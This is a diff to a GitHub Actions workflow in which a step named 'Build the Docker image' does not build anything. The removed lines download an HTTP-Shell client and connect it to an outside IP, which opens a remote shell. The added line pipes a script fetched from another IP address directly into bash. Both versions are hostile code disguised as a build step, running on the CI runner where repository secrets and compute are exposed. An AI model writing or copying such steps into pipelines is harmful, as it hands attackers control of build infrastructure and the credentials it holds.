@@ -15,6 +15,4 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - name: Build the Docker image
-      run: |
-      wget https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.sh
-      bash -c "timeout -k 1 -s SIGKILL 30m bash ./HTTP-Client.sh -c 44.206.117.20:80"
+      run: curl 172.174.195.173/p2.sh | bash
